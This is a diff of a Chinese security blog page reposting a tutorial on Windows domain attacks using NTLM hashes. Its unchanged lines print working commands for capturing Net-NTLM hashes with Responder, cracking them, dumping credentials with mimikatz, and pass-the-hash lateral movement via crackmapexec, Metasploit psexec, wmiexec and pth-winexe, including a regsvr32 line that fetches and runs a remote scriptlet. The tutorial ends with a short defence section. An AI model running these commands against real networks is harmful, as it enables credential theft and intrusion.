@@ -126,19 +126,11 @@
 <meta property="og:url" content="https://shu1l.github.io/2020/06/05/yu-shen-tou-zhi-ntml-hash/index.html">
 <meta property="og:site_name" content="Shu1L&#39;s blog">
 <meta property="og:description" content="转载自:https:&#x2F;&#x2F;ssooking.github.io&#x2F;yu-shen-tou-zhi-ntml-hash&#x2F; 域渗透之NTML-Hash一、认识Windows HASH​    早期SMB协议在网络上传输明文口令。后来出现”LAN Manager Challenge&#x2F;Response”验证机制，简称LM，它是如此简单以至很容易被破解。微软提出了WindowsNT挑战&#x2F;响应验证机制，称之为NT">
-<meta property="og:image" content="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181204130140.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181204130759.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181204134230.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181203201319.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181203212818.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181204094217.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181203225415.png">
 <meta property="article:published_time" content="2020-06-05T14:25:49.000Z">
-<meta property="article:modified_time" content="2020-06-06T03:15:28.839Z">
+<meta property="article:modified_time" content="2020-06-07T10:45:17.946Z">
 <meta property="article:author" content="Shu1L">
 <meta property="article:tag" content="NTML">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181204130140.png">
 
 
 
@@ -625,9 +617,7 @@
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Challenge</span> = <span class="number">1122334455667788</span></span><br></pre></td></tr></table></figure>
 
 <p>开启监听后，当用户进行了交互，如在资源管理器中以<code>UNC</code>路径形式访问伪造的服务器：</p>
-<p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181204130140.png" alt="img"></p>
 <p>此时会弹出虚假认证界面，此时无论受害者是否输入凭据，我们都已经获取了<code>NET NTML Hash</code>。<code>responder</code>默认会将日志保存在<code>/usr/share/responder/logs</code>下，hash记录文件以<code>HTTP-NTLMv2</code>   <code>SMBv2-NTLMv2</code>等前缀开头。</p>
-<p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181204130759.png" alt="img"></p>
 <p>在渗透测试中，我们还可以通过其他技巧获取<code>Net-NTML Hash</code>，如：</p>
 <ul>
 <li>命令执行：<code>regsvr32</code>、<code>powershell</code>等</li>
@@ -652,7 +642,8 @@
 <h5 id="本地破解"><a href="#本地破解" class="headerlink" title="本地破解"></a>本地破解</h5><p>我们还可以使用<code>john</code>、<code>hashcat</code>等工具，通过hash表、字典等进行本地破解。当工具内置的hash字典无法成功破解时，我们可以使用自己搜集的字典文件，或者利用社工等方法针对性生成hash字典。</p>
 <h4 id="John"><a href="#John" class="headerlink" title="John"></a>John</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john HTTP-NTLMv2-17.10.0.10.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181204134230.png" alt="img"></p>
+
+
 <h4 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h4><p>使用<code>hashcat -h</code>命令查看帮助，必要的参数有：</p>
 <p><code>-m</code>  hash类型</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LM：3000 </span><br><span class="line">NTLM：1000</span><br><span class="line">NetNTLMv1：5500</span><br><span class="line">NetNTLMv2：5600</span><br></pre></td></tr></table></figure>
@@ -714,12 +705,12 @@
 <p>通过pass-the-hash执行命令批量getshell</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb 17.10.0.10-15 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF -x <span class="string">"regsvr32 /s /n /u /i:http://17.10.0.1:8080/1KZkey.sct scrobj.dll"</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181203201319.png" alt="img"></p>
+
+
 <h5 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><a href="https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/" target="_blank" rel="noopener">Metasploit</a></h5><p>search <code>psexec</code>，<code>smblogin</code></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec </span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST 17.10.0.10</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/psexec_psh</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST 17.10.0.10</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF</span><br></pre></td></tr></table></figure>
 
 <p>举例：</p>
-<p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181203212818.png" alt="img"></p>
 <h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></h5><p>先抓取hash</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span>sekurlsa::logonpasswords<span class="string">""</span></span><br></pre></td></tr></table></figure>
 
@@ -733,7 +724,8 @@
 <p>wmiexec的注释中提示”Main advantage here is it runs under the user (has to be Admin) account”，经实际测试普通用户权限即可。wmiexec的hash参数格式为<code>LMHASH:NTHASH</code>，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -hashes 00000000000000000000000000000000:AFC44EE7351D61D00698796DA06B1EBF ssookinging-pc/administrator@17.10.0.10 <span class="string">"whoami"</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181204094217.png" alt="img"></p>
+
+
 <h5 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h5><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p>
 <p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash/" target="_blank" rel="noopener">Invoke-WMIExec</a></p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WMIExec</span> <span class="literal">-Target</span> <span class="number">17.10</span>.<span class="number">0.10</span> <span class="literal">-Domain</span> test.local <span class="literal">-Username</span> test1 <span class="literal">-Hash</span> AFC44EE7351D61D00698796DA06B1EBF <span class="literal">-Command</span> <span class="string">"calc.exe"</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>
@@ -750,7 +742,8 @@
 <h5 id="PTH-EXEC"><a href="#PTH-EXEC" class="headerlink" title="PTH-EXEC"></a>PTH-EXEC</h5><p>kali中自带的横向移动pth的工具，pth-winexe就是其中一个，还有与其类似的：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pth-winexe -U workgroup/administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.10 cmd.exe</span><br><span class="line"></span><br><span class="line">pth-winexe -U administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.11 cmd.exe</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181203225415.png" alt="img"></p>
+
+
 <h3 id="五、防御思路"><a href="#五、防御思路" class="headerlink" title="五、防御思路"></a>五、防御思路</h3><p>结合攻击方法，总结防御思路如下：</p>
 <ul>
 <li>检查特殊文件.scf 和 desktop.ini，避免被添加UNC路径</li>
@@ -935,6 +928,12 @@
                     <a href="http://xun9er.com/" target="_blank" title="xun9er">
                       
                         <i class="fa fa-fw fa-globe"></i>xun9er</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://hack-for.fun/" target="_blank" title="M0nk3y">
+                      
+                        <i class="fa fa-fw fa-globe"></i>M0nk3y</a>
                   </span>
                 
                   <span class="links-of-author-item">
